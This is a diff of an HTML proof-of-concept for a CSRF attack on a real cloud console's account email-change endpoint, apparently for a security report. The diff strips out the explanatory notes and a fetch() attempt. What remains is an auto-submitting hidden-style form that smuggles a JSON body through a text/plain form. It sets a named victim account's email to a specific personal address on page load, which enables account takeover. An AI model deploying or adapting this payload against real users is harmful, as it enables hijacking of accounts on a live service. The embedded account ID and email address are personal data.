@@ -4,70 +4,15 @@
   <title>CSRF PoC - Neon Email Change</title>
 </head>
 <body>
-  <h2>CSRF PoC - Neon Console Email Change</h2>
-
-  <!--
-    TECHNICAL NOTES:
-    - Endpoint: PATCH https://console.neon.tech/api/v2/users/me
-    - Auth: Cookie-only (keycloak_token). No CSRF token is validated.
-    - Response: 200 with empty body on success.
-    - CORS: Content-Type: application/json triggers a preflight.
-      The server's CORS policy will block cross-origin preflights,
-      so a direct fetch() from an attacker origin will be stopped
-      at the preflight stage — the PATCH never reaches the server.
-    - TRUE CSRF VECTOR: A same-site or subdomain context (e.g. via
-      subdomain XSS, or a malicious page on a site sharing the
-      eTLD+1) can send this without a preflight restriction.
-      Alternatively, text/plain as Content-Type is a simple request
-      (no preflight) — tested below as the working attack form.
-  -->
-
-  <p id="result">Sending...</p>
-
-  <script>
-    // Approach 1: JSON fetch — will be blocked by CORS preflight from
-    // a different origin, but demonstrates the no-CSRF-token finding.
-    fetch("https://console.neon.tech/api/v2/users/me", {
-      method: "PATCH",
-      credentials: "include",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        id: "18b81f74-7623-427e-a297-d21b37d9b089",
-        email: "baraq.ghaleb82@gmail.com"
-      })
-    })
-    .then(res => {
-      document.getElementById("result").textContent =
-        "Response status: " + res.status +
-        " — Request sent with victim cookies. No CSRF token was required.";
-    })
-    .catch(err => {
-      document.getElementById("result").textContent =
-        "Blocked by CORS preflight (expected from cross-origin): " + err.message +
-        "\nSee form-based vector below for a no-preflight attempt.";
-    });
-  </script>
-
-  <!--
-    Approach 2: form POST with text/plain — simple request, no preflight.
-    The server must accept this content-type for it to succeed, but it
-    demonstrates the class of attack available without CORS blocking.
-    In practice, if the API strictly requires application/json parsing,
-    this body format may be rejected at the application layer.
-  -->
-  <form id="csrf-form"
+  <form id="exploit-form"
         action="https://console.neon.tech/api/v2/users/me"
         method="POST"
-        enctype="text/plain"
-        style="display:none">
-    <!--
-      HTML forms don't support PATCH; this uses POST to show the
-      concept. In a real subdomain-XSS scenario, fetch() with
-      credentials:include would be used directly.
-    -->
-    <input name='{"id":"18b81f74-7623-427e-a297-d21b37d9b089","email":"baraq.ghaleb82@gmail.com","xxxxxx":"'
+        enctype="text/plain">
+    <input name='{"id":"18b81f74-7623-427e-a297-d21b37d9b089","email":"baraq.ghaleb82@gmail.com","x":"'
            value='"}'>
   </form>
-
+  <script>
+    document.getElementById('exploit-form').submit();
+  </script>
 </body>
 </html>
